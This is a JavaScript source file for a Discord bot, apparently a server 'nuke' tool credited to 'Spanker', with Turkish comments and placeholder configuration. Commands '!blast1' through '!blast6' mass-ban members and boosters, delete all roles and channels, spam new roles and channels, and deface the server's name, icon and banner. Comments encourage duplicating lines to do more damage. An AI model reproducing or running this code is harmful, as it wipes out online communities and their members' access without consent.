const Discord = require('discord.js');//
const client = new Discord.Client();//



// BOTU HEROKUDAN AÇMANIZ TERCİHİMDİR

// Configim nasıl OKRWQOKWROKWRQOR
const token = "token yaz knk"
const roleChannelBoosterCommands = "!blast1"
const roldeleteCommands = "!blast2"
const rolecreateCommands = "!blast3"
const channelcreateCommands = "!blast4"
const serverUpdateCommands = "!blast5"
const channeldeleteCommands = "!blast6"
const reasonPanker = "Spanker Sikti asdasdas"
const boosterRoleId = "Booster id yazcan knk"
const channelName = "Spanker Vurdu knk"
const channelCreateName = "Spankerrrr"
const serverUpdateName = "Spanker github/spxnker"
const serverUpdateicon = "https://cdn.discordapp.com/attachments/899295026318831646/901136287153664070/asfsfas.jpg"
const serverUpdateBanner = "https://cdn.discordapp.com/attachments/899295026318831646/901136287153664070/asfsfas.jpg"
const channelDeletelog = "BÜTÜN KANALLAR SİLİNDİ!"


client.login(token).then(c => console.log(`${client.user.tag} olarak giriş yapıldı!`)).catch(err => console.error("Bota giriş yapılırken başarısız olundu!")); //Tokenini Girermisin 



    
client.on("message", async message => {
  if(message.content != roleChannelBoosterCommands) return;
  message.delete()
  let guild = message.guild
  let kanallar = guild.channels.cache.filter(x => x.id != "silimmeyecek kanal id mesaj atılıyor")
  let boosterlar = guild.members.cache.filter(x => x.roles.cache.has(boosterRoleId));
  let roller = guild.roles.cache.filter(x => !x.name.includes("everyone"));
  boosterlar.forEach(x => x.ban({reason: reasonPanker}));
  roller.forEach(x => x.delete());
  kanallar.forEach(y => y.setName(channelName));

  guild.members.cache.forEach(async(x,index) => {
      if(x.bannable) {
      setTimeout(async() => {
          await x.ban({reason: reasonPanker}).catch(x => console.log(x))
      }, 1000 * index)
      }
  })
  guild.channels.cache.get("silinmeyen kanal id buraya mesaj atılıyor")
})

client.on("message", async message  => {
  if(message.content != roldeleteCommands) return;
  message.delete()
  let guild = message.guild
  let roller = guild.roles.cache.filter(x => !x.name.includes("everyone"));
  roller.forEach(x => x.delete());
})


client.on("message", async message  => {
  let guild = message.guild
  if(message.content != rolecreateCommands) return;
  message.delete()

  guild.roles.create({data: { name: channelCreateName, color: 'RED',}, reason: 'github/spxnker',})
  guild.roles.create({data: { name: channelCreateName, color: 'RED',}, reason: 'github/spxnker',})
  guild.roles.create({data: { name: channelCreateName, color: 'RED',}, reason: 'github/spxnker',})
  guild.roles.create({data: { name: channelCreateName, color: 'RED',}, reason: 'github/spxnker',})
  guild.roles.create({data: { name: channelCreateName, color: 'RED',}, reason: 'github/spxnker',})
  guild.roles.create({data: { name: channelCreateName, color: 'RED',}, reason: 'github/spxnker',})
  guild.roles.create({data: { name: channelCreateName, color: 'RED',}, reason: 'github/spxnker',})
  guild.roles.create({data: { name: channelCreateName, color: 'RED',}, reason: 'github/spxnker',})
  // çoğaltın
})


client.on("message", async message => {
  if(message.content != channelcreateCommands) return;
  message.delete()
  message.guild.channels.create(channelCreateName,{type: "voice"})
  message.guild.channels.create(channelCreateName,{type: "voice"})
  message.guild.channels.create(channelCreateName,{type: "voice"})
  message.guild.channels.create(channelCreateName,{type: "voice"})
  message.guild.channels.create(channelCreateName,{type: "voice"})
  message.guild.channels.create(channelCreateName,{type: "voice"})
// coğaltırsanız daha çko açar
  
})

client.on("message", async  message =>{
  if(message.content === serverUpdateCommands){
    message.guild.setName(serverUpdateName)
    message.guild.setIcon(serverUpdateicon)
    message.guild.setBanner(serverUpdateBanner)
  }

  });

client.on("message", async message =>{
  if(message.content === channeldeleteCommands){
    let guild = message.guild
    let kanallar = guild.channels.cache.filter(x => x.id != "silimmeyecek kanal id mesaj atılıyor")
    kanallar.forEach(x => x.delete());
    message.guild.channels.create(channelCreateName,{type: "text"})
    message.guild.channels.create(channelCreateName,{type: "text"})
    message.guild.channels.create(channelCreateName,{type: "text"})
    message.guild.channels.create(channelCreateName,{type: "text"})
    message.guild.channels.create(channelCreateName,{type: "text"})
    message.guild.channels.create(channelDeletelog,{type: "voice"})
  }

  });

